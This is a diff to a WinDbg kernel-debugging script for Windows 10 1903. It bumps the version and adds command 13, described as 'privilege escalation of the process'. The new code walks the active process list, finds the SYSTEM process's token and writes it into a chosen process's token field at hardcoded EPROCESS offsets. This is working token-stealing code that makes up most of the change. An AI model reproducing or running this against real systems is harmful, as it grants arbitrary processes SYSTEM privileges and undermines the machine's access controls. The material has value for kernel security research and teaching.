@@ -5,7 +5,8 @@ $$ All the structure offset is hardcoded base on:
 $$ win10-1903 amd64, kernel version 18362
 $$
 
-aS ARKD_VERSION	"v0.04"
+ad *
+aS ARKD_VERSION	"v0.06"
 aS ARKD_AUTHOR	"wzt"
 aS ARKD_SITE	"http://github.com/cloudsec"
 
@@ -29,6 +30,7 @@ aS ARKD_SITE	"http://github.com/cloudsec"
 	.printf "10 <pid>\t--\tlist process vads.\n"
 	.printf "11\t\t--\tlist object types.\n"
 	.printf "12\t\t--\tlist security descriptor.\n"
+	.printf "13 <pid>\t--\tprivilege escalation of the process.\n"
 	.printf "\n"
 }
 .elsif (${$arg1} == 1)
@@ -641,8 +643,50 @@ r @$t2=poi($t1);
 	r @$t2=poi(@$t2)
 }
 }
+.elsif (${$arg1} == 13)
+{
+r @$t1=nt!PsActiveProcessHead;
+r @$t2=poi($t1);
+
+r @$t3 = 0
+r @$t4 = 0
+r @$t5 = 0
+
+.while (@$t2 != @$t1)
+{
+	.if (poi(@$t2-0x8) == 4)
+	{
+		r @$t3 = poi(@$t2-0x2f0+0x360) & 0xfffffffffffffff0
+		.printf "get system.exe token %p\n", @$t3
+		r @$t5 = @$t5 + 1
+		r @$t2=poi(@$t2)
+		.continue
+	}
+
+	.if (poi(@$t2-0x8) == 0n${$arg2})
+	{
+		r @$t4 = @$t2-0x2f0+0x360
+		.printf "target process %d token %p\n",  0n${$arg2}, @$t4
+		r @$t5 = @$t5 + 1
+		r @$t2=poi(@$t2)
+		.continue
+	}
+		
+	r @$t2=poi(@$t2)
+}
+
+.if (@$t3 == 0 or @$t4 == 0 or @$t5 == 0)
+{
+	.printf "target process %d privilege escalation failed.\n", 0n${$arg2}
+}
+.else
+{
+	eq @$t4 @$t3
+	
+	.printf "target process %d privilege escalation successful.\n", 0n${$arg2}
+} 
+}
 .else
 {
 	.printf "Wrong argument.\n"
 }
-
